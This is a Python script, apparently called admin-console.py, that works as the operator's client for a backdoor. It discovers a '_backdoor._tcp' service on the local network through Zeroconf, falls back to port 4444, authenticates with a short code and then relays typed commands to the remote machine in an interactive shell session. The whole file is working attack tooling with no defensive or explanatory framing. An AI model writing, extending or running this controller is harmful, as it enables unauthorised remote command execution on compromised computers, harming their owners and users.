import socket
import sys
import time
import threading
from zeroconf import ServiceBrowser, Zeroconf, ServiceListener

class BackdoorListener(ServiceListener):
    def __init__(self, target_code):
        self.target_code = target_code
        self.found_service = None
        
    def add_service(self, zc, type_, name):
        if self.target_code in name:
            info = zc.get_service_info(type_, name)
            if info:
                ip = ".".join(str(b) for b in info.addresses[0])
                port = info.port
                self.found_service = (ip, port)
                print(f"Found backdoor at {ip}:{port}")

    def update_service(self, zc, type_, name):
        pass

    def remove_service(self, zc, type_, name):
        pass

def discover_backdoor(target_code, timeout=10):
    zeroconf = Zeroconf()
    listener = BackdoorListener(target_code)
    
    browser = ServiceBrowser(zeroconf, "_backdoor._tcp.local.", listener)
    
    print(f"Searching for backdoor with code: {target_code}...")
    
    start_time = time.time()
    while time.time() - start_time < timeout:
        if listener.found_service:
            zeroconf.close()
            return listener.found_service
        time.sleep(0.5)
    
    zeroconf.close()
    return None

def parse_target(target):
    if ":" in target:
        code, port = target.split(":", 1)
        return code.strip(), int(port)
    return target.strip(), 4444

def connect_to_backdoor(target):
    code, default_port = parse_target(target)
    
    found_service = discover_backdoor(code)
    
    if found_service:
        ip, port = found_service
        print(f"Discovered via Zeroconf: {ip}:{port}")
    else:
        print("Zeroconf discovery failed. Trying local network...")
        ip = "127.0.0.1"
        port = default_port
    
    print(f"Connecting to {ip}:{port}...")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect((ip, port))
        
        sock.send(code.encode())
        
        response = b""
        sock.settimeout(2)
        
        try:
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        
        response_text = response.decode()
        
        if "AUTH_SUCCESS" in response_text:
            print("Connected successfully!")
            sock.settimeout(30)
            return sock, response_text
        else:
            print(f"Authentication failed. Response: {response_text}")
            sock.close()
            return None, None
            
    except Exception as e:
        print(f"Connection failed: {e}")
        return None, None

def receive_messages(sock, stop_event):
    while not stop_event.is_set():
        try:
            data = sock.recv(4096).decode()
            if not data:
                break
            print(data, end='', flush=True)
        except socket.timeout:
            continue
        except:
            break

def interactive_session(sock, initial_data):
    stop_event = threading.Event()
    
    try:
        if initial_data:
            auth_index = initial_data.find("AUTH_SUCCESS")
            if auth_index != -1:
                print(initial_data[auth_index:], end='', flush=True)
        
        receiver = threading.Thread(target=receive_messages, args=(sock, stop_event), daemon=True)
        receiver.start()
        
        while True:
            try:
                command = input()
                if command.lower() == 'exit':
                    break
                sock.send((command + '\n').encode())
            except KeyboardInterrupt:
                break
            except EOFError:
                break
                
    except Exception as e:
        print(f"Session error: {e}")
    finally:
        stop_event.set()
        sock.close()
        print("\nDisconnected.")

def main():
    if len(sys.argv) != 2:
        print("Usage: python admin-console.py <CODE:PORT>")
        print("Example: python admin-console.py CYRSA5:4444")
        sys.exit(1)
    
    target = sys.argv[1]
    sock, initial_data = connect_to_backdoor(target)
    
    if sock:
        interactive_session(sock, initial_data)
    else:
        print("Failed to establish connection.")

if __name__ == "__main__":
    main()